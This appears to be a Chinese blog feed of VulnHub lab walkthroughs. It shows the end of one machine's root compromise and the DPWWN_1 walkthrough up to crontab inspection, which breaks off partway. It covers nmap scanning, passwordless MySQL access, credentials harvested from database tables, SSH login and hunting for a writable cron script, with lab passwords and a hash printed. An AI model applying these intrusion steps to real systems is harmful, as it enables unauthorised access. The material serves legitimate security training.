be trademarks of their respective<br>owners.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>mysql&gt; show databases;<br>show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| sys                |<br>| vulnwp             |<br>+--------------------+<br>5 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; use vulnwp<br>use vulnwp<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br></code></pre></td></tr></table></figure><p>看一看 wp_user 表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> * from wp_users;<br><span class="hljs-keyword">select</span> * from wp_users;<br>+----+-----------------+------------------------------------+-----------------+-------------------+----------+---------------------+---------------------+-------------+-----------------+<br>| ID | user_login      | user_pass                          | user_nicename   | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name    |<br>+----+-----------------+------------------------------------+-----------------+-------------------+----------+---------------------+---------------------+-------------+-----------------+<br>|  1 | c0rrupt3d_brain | $P<span class="hljs-variable">$BeIRcDvfjdzumCYjeRfShVUMy8BkXf</span>/ | c0rrupt3d_brain | vuln@localhost.ws |          | 2019-10-31 21:47:00 |                     |           0 | c0rrupt3d_brain |<br>+----+-----------------+------------------------------------+-----------------+-------------------+----------+---------------------+---------------------+-------------+-----------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><h3 id="home-目录下的隐藏文件"><a href="#home-目录下的隐藏文件" class="headerlink" title="home 目录下的隐藏文件"></a>home 目录下的隐藏文件</h3><p>就一个用户，它的密码我们已经通过爆破拿到了，进 home 目录看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu-extermely-vulnerable-m4ch1ine:/$ <span class="hljs-built_in">cd</span> /home<br><span class="hljs-built_in">cd</span> /home<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>root3r<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 12K<br>262146 drwxr-xr-x  3 root     root     4.0K Oct 30  2019 .<br>     2 drwxr-xr-x 23 root     root     4.0K Oct 30  2019 ..<br>286738 drwxr-xr-x  3 www-data www-data 4.0K Nov  1  2019 root3r<br></code></pre></td></tr></table></figure><p>有个 root3r 用户，而且当前用户对此目录可控，进去看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home$ <span class="hljs-built_in">cd</span> root3r<br><span class="hljs-built_in">cd</span> root3r/<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 40K<br>286738 drwxr-xr-x 3 www-data www-data 4.0K Nov  1  2019 .<br>262146 drwxr-xr-x 3 root     root     4.0K Oct 30  2019 ..<br>282108 -rw-r--r-- 1 www-data www-data  515 Oct 30  2019 .bash_history<br>278324 -rw-r--r-- 1 www-data www-data  220 Oct 30  2019 .bash_logout<br>262821 -rw-r--r-- 1 www-data www-data 3.7K Oct 30  2019 .bashrc<br>286752 drwxr-xr-x 2 www-data www-data 4.0K Oct 30  2019 .cache<br>282130 -rw-r--r-- 1 www-data www-data   22 Oct 30  2019 .mysql_history<br>278338 -rw-r--r-- 1 www-data www-data  655 Oct 30  2019 .profile<br>282736 -rw-r--r-- 1 www-data www-data    8 Oct 31  2019 .root_password_ssh.txt<br>282182 -rw-r--r-- 1 www-data www-data    0 Oct 30  2019 .sudo_as_admin_successful<br>282524 -rw-r--r-- 1 root     root        4 Nov  1  2019 test.txt<br></code></pre></td></tr></table></figure><p>目录下有不少好东西，先看看.root_password_ssh.txt 吧，从名字上看可能是 root 的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ <span class="hljs-built_in">cat</span> .root_password_ssh.txt<br>sh.txtoot_password_s <br>willy26<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ <span class="hljs-built_in">cat</span> .mysql_history<br><span class="hljs-built_in">cat</span> .mysql_history<br>_HiStOrY_V2_<br><span class="hljs-built_in">exit</span>\040<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ su -<br>su -<br>Password: _HiStOrY_V2_<br><br>su: Authentication failure<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ ^[[A<br>su -<br>Password: willy26<br>root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>成功切换为 root 用户，最后来个定妆照</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="hljs-comment"># cat proof.txt</span><br><span class="hljs-built_in">cat</span> proof.txt<br>voila you have successfully pwned me :) !!!<br>:D<br>root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:06:73:f2 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.103/24 brd 192.168.56.255 scope global enp0s3<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe06:73f2/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 52:54:00:c5:7d:1b brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0<br>       valid_lft forever preferred_lft forever<br>4: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc pfifo_fast master virbr0 state DOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 52:54:00:c5:7d:1b brd ff:ff:ff:ff:ff:ff<br>root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux ubuntu-extermely-vulnerable-m4ch1ine 4.4.0-87-generic <span class="hljs-comment">#110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DPWWN_1靶机</title>
    <link href="/2023/06/15e7bb7309ab.html"/>
    <url>/2023/06/15e7bb7309ab.html</url>
    
    <content type="html"><![CDATA[<h1 id="DPWWN-1-靶机"><a href="#DPWWN-1-靶机" class="headerlink" title="DPWWN_1 靶机"></a>DPWWN_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.142<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-26 23:04 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.142<br>Host is up (0.0011s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3306/tcp open  mysql<br>MAC Address: 00:0C:29:74:F0:06 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 5.04 seconds<br></code></pre></td></tr></table></figure><p>开放了 22，80，3306 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --top-ports 20 -sU 192.1.1.142  <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-26 23:04 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.142<br>Host is up (0.00022s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   closed        snmptrap<br>445/udp   open|filtered microsoft-ds<br>500/udp   open|filtered isakmp<br>514/udp   closed        syslog<br>520/udp   open|filtered route<br>631/udp   open|filtered ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 00:0C:29:74:F0:06 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.58 seconds<br></code></pre></td></tr></table></figure><p>UDP 扫描没什么有价值的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80,3306 192.1.1.142      <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-26 23:10 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.142<br>Host is up (0.0019s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 c1:d3:be:39:42:9d:5c:b4:95:2c:5b:2e:20:59:0e:3a (RSA)<br>|   256 43:4a:c6:10:e7:17:7d:a0:c0:c3:76:88:1d:43:a1:8c (ECDSA)<br>|_  256 0e:cc:e3:e1:f7:87:73:a1:03:47:b9:e2:cf:1c:93:15 (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/<span class="hljs-number">5.4</span>.<span class="hljs-number">16</span>)<br>|_http-title: Apache HTTP Server Test Page powered by CentOS<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">6</span> (CentOS) PHP/<span class="hljs-number">5.4</span>.<span class="hljs-number">16</span><br><span class="hljs-number">3306</span>/tcp open  mysql   MySQL <span class="hljs-number">5.5</span>.<span class="hljs-number">60</span>-MariaDB<br>| mysql-info: <br>|   Protocol: <span class="hljs-number">10</span><br>|   Version: <span class="hljs-number">5.5</span>.<span class="hljs-number">60</span>-MariaDB<br>|   Thread ID: <span class="hljs-number">4</span><br>|   Capabilities flags: <span class="hljs-number">63487</span><br>|   Some Capabilities: LongPassword, Speaks41ProtocolNew, SupportsLoadDataLocal, SupportsTransactions, Support41Auth, DontAllowDatabaseTableColumn, InteractiveClient, FoundRows, ConnectWithDatabase, LongColumnFlag, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, Speaks41ProtocolOld, ODBCClient, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins<br>|   Status: Autocommit<br>|   Salt: i7tdxO_q9h#q3GK#ik^t<br>|_  Auth Plugin Name: mysql_native_password<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">74</span>:F0:<span class="hljs-number">06</span> (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least <span class="hljs-number">1</span> open and <span class="hljs-number">1</span> closed port<br>Device type: general purpose<br>Running: Linux <span class="hljs-number">3</span>.X|<span class="hljs-number">4</span>.X<br>OS CPE: cpe:/o:linux:linux_kernel:<span class="hljs-number">3</span> cpe:/o:linux:linux_kernel:<span class="hljs-number">4</span><br>OS details: Linux <span class="hljs-number">3.2</span> - <span class="hljs-number">4.9</span><br>Network Distance: <span class="hljs-number">1</span> hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">9.48</span> seconds<br></code></pre></td></tr></table></figure><p>Apache&#x2F;2.4.6 (CentOS) PHP&#x2F;5.4.16， MySQL 5.5.60-MariaDB</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80,3306 192.1.1.142     <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-26 23:14 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.142<br>Host is up (0.00026s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-trace: TRACE is enabled</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /info.php: Possible information file</span><br><span class="hljs-string">|_  /icons/: Potentially interesting folder w/ directory listing</span><br><span class="hljs-string">3306/tcp open  mysql</span><br><span class="hljs-string">|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">MAC Address: 00:0C:29:74:F0:06 (VMware)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 31.22 seconds</span><br></code></pre></td></tr></table></figure><p>漏洞脚本扫描给了个 info.php，打开发现是 phpinfo 界面，从中提取了一些系统和路径的信息。</p><h2 id="MySQL-登录"><a href="#MySQL-登录" class="headerlink" title="MySQL 登录"></a>MySQL 登录</h2><p>尝试登录mysql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/DPWWN_1]<br>└─$ mysql -u root -h 192.1.1.142<br>ERROR 1129 (HY000): Host <span class="hljs-string">&#x27;192.1.1.128&#x27;</span> is blocked because of many connection errors; unblock with <span class="hljs-string">&#x27;mysqladmin flush-hosts&#x27;</span><br></code></pre></td></tr></table></figure><p>呃呃呃，好像有点问题，连接太多，猜测可能是之前扫描的问题。刚开始没管这个错误，开始找别的思路，尝试了从 phpinfo 里找突破口，从目录爆破找隐藏文件夹，但是都失败了，这台靶机暴露面比较少。偷瞄了眼 WP，确定是 MySQL 登录作为攻击面，于是果断重启靶机，后面就很简单了，从数据库的各个表里找泄露的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/DPWWN_1]<br>└─$ mysql -u root -h 192.1.1.142<br>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br>Your MariaDB connection <span class="hljs-built_in">id</span> is 2<br>Server version: 5.5.60-MariaDB MariaDB Server<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>MariaDB [(none)]&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| ssh                |<br>+--------------------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.008 sec)<br><br>MariaDB [(none)]&gt; use ssh<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [ssh]&gt; show tables;<br>+---------------+<br>| Tables_in_ssh |<br>+---------------+<br>| <span class="hljs-built_in">users</span>         |<br>+---------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.009 sec)<br><br>MariaDB [ssh]&gt; <span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span>;<br>+----+----------+---------------------+<br>| <span class="hljs-built_in">id</span> | username | password            |<br>+----+----------+---------------------+<br>|  1 | mistic   | testP@$<span class="hljs-variable">$swordmistic</span> |<br>+----+----------+---------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.002 sec)<br></code></pre></td></tr></table></figure><h2 id="ssh-登录"><a href="#ssh-登录" class="headerlink" title="ssh 登录"></a>ssh 登录</h2><p>拿到了 ssh 的用户名和密码，尝试登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/DPWWN_1]<br>└─$ ssh mistic@192.1.1.142                  <br>The authenticity of host <span class="hljs-string">&#x27;192.1.1.142 (192.1.1.142)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:gk40nSGfkMrCYAeMyL2l9aCwV/VL5i5mWKrFfowOfH0.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.1.1.142<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">mistic@192.1.1.142\&#x27;</span>s password: <br>Last login: Thu Aug  1 14:41:37 2019 from 192.168.30.145<br>[mistic@dpwwn-01 ~]$ <span class="hljs-built_in">whoami</span><br>mistic<br>[mistic@dpwwn-01 ~]$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:74:f0:06 brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.142/24 brd 192.1.1.255 scope global noprefixroute dynamic ens33<br>       valid_lft 1336sec preferred_lft 1336sec<br>    inet6 fe80::20c:29ff:fe74:f006/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>[mistic@dpwwn-01 ~]$ <span class="hljs-built_in">uname</span> -a<br>Linux dpwwn-01 3.10.0-957.el7.centos.plus.i686 <span class="hljs-comment">#1 SMP Wed Nov 7 19:17:19 UTC 2018 i686 i686 i386 GNU/Linux</span><br>[mistic@dpwwn-01 ~]$ sudo -l<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br>[sudo] password <span class="hljs-keyword">for</span> mistic: <br>Sorry, user mistic may not run sudo on dpwwn-01.<br><br></code></pre></td></tr></table></figure><p>登录成功，接下来看看当前家目录下的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">[mistic@dpwwn-01 ~]$ <span class="hljs-built_in">ls</span> -liah<br>total 16K<br>2536099 drwx------. 2 mistic mistic 100 Aug  1  2019 .<br>     79 drwxr-xr-x. 3 root   root    20 Aug  1  2019 ..<br>2536125 -rw-------. 1 mistic mistic   0 Aug  1  2019 .bash_history<br>2536100 -rw-r--r--. 1 mistic mistic  18 Oct 30  2018 .bash_logout<br>2536101 -rw-r--r--. 1 mistic mistic 193 Oct 30  2018 .bash_profile<br>2536102 -rw-r--r--. 1 mistic mistic 231 Oct 30  2018 .bashrc<br>2536126 -rwx------. 1 mistic mistic 186 Aug  1  2019 logrot.sh<br>[mistic@dpwwn-01 ~]$ <span class="hljs-built_in">cat</span> logrot.sh <br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#LOGFILE=&quot;/var/tmp&quot;</span><br><span class="hljs-comment">#SEMAPHORE=&quot;/var/tmp.semaphore&quot;</span><br><br><br><span class="hljs-keyword">while</span> : ; <span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">read</span> line<br>  <span class="hljs-keyword">while</span> [[ -f <span class="hljs-variable">$SEMAPHORE</span> ]]; <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">sleep</span> 1s<br>  <span class="hljs-keyword">done</span><br>  <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%s\n&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> &gt;&gt; <span class="hljs-variable">$LOGFILE</span><br><span class="hljs-keyword">done</span><br><br></code></pre></td></tr></table></figure><h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><p>感觉像个定时任务的脚本，而且这个文件是当前用户完全可控的，看看定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">[mistic@dpwwn-01 ~]$ <span class="hljs-built_in">cat</span> /etc/crontab<br>SHELL=/bin/bash<br>PATH=/sbin:/bin:/usr/sbin:/usr/bin<br>MAILTO=root<br><br><span class="hljs-comment"># For details see man 4 crontabs</span><br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 